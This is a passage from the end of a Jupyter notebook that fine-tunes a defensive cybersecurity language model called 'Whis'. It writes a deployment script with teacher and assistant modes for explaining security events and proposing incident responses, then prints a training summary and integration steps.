    "Analyze this security incident and propose specific response actions with justification.\n",
    "\n",
    "### Input:\n",
    "{{incident_description}}\n",
    "\n",
    "### Response:\"\"\"\n",
    "        \n",
    "        return self._generate_response(prompt)\n",
    "    \n",
    "    def _generate_response(self, prompt, max_length=1024):\n",
    "        \"\"\"Generate response using the fine-tuned model\"\"\"\n",
    "        inputs = self.tokenizer(prompt, return_tensors=\"pt\").to(self.model.device)\n",
    "        \n",
    "        with torch.no_grad():\n",
    "            outputs = self.model.generate(\n",
    "                **inputs,\n",
    "                max_length=max_length,\n",
    "                temperature=0.3,\n",
    "                top_p=0.9,\n",
    "                do_sample=True,\n",
    "                pad_token_id=self.tokenizer.eos_token_id,\n",
    "                eos_token_id=self.tokenizer.eos_token_id\n",
    "            )\n",
    "        \n",
    "        response = self.tokenizer.decode(outputs[0], skip_special_tokens=True)\n",
    "        return response[len(prompt):].strip()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    # Demo usage\n",
    "    whis = WhisCybersecLLM()\n",
    "    \n",
    "    # Teacher mode example\n",
    "    explanation = whis.explain_event(\"Multiple failed logon events from IP 192.168.1.100\")\n",
    "    print(\"üéì Teacher Mode Response:\")\n",
    "    print(explanation)\n",
    "    \n",
    "    print(\"\\n\" + \"=\"*80 + \"\\n\")\n",
    "    \n",
    "    # Assistant mode example  \n",
    "    response = whis.propose_response(\"Suspicious PowerShell execution detected on multiple endpoints\")\n",
    "    print(\"ü§ñ Assistant Mode Response:\")\n",
    "    print(response)\n",
    "\"\"\"\n",
    "\n",
    "with open(f\"{config.output_dir}/deploy_whis.py\", \"w\") as f:\n",
    "    f.write(deployment_script)\n",
    "\n",
    "print(\"üöÄ Deployment script created: deploy_whis.py\")\n",
    "print(\"\\nüìã To use the model:\")\n",
    "print(f\"  python {config.output_dir}/deploy_whis.py\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üéØ Final Summary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"üéØ Whis Cybersecurity LLM Fine-tuning Complete!\")\n",
    "print(\"=\" * 60)\n",
    "print(f\"ü§ñ Model: {config.model_name}\")\n",
    "print(f\"üì¶ Base: {config.base_model_id}\")\n",
    "print(f\"üìä Training Examples: {len(formatted_training_data)}\")\n",
    "print(f\"üõ°Ô∏è Cybersecurity Domains: {len(CYBERSEC_DOMAINS)}\")\n",
    "print(f\"‚è∞ Training Duration: Completed\")\n",
    "print(f\"üíæ Model Location: {config.output_dir}\")\n",
    "\n",
    "print(\"\\nüéì Training Domains Covered:\")\n",
    "for domain in CYBERSEC_DOMAINS.keys():\n",
    "    print(f\"  ‚úÖ {domain.replace('_', ' ').title()}\")\n",
    "\n",
    "print(\"\\nüöÄ Ready for Integration:\")\n",
    "print(\"  ‚Ä¢ Whis Teacher Mode: Explain security events\")\n",
    "  print(\"  ‚Ä¢ Whis Assistant Mode: Propose response actions\")\n",
    "print(\"  ‚Ä¢ SOAR Integration: Automated playbook routing\")\n",
    "print(\"  ‚Ä¢ SIEM Enrichment: Enhanced detection context\")\n",
    "\n",
    "print(\"\\nüìã Next Steps:\")\n",
    "print(\"  1. Test with real security events\")\n",
    "print(\"  2. Integrate with SOAR-Copilot API\")\n",
    "print(\"  3. Deploy to production environment\")\n",
    "print(\"  4. Monitor performance and retrain as needed\")\n",
    "\n",
    "print(f\"\\nüõ°Ô∏è Whis is ready to enhance your security operations!\")"
   ]
  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.10\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}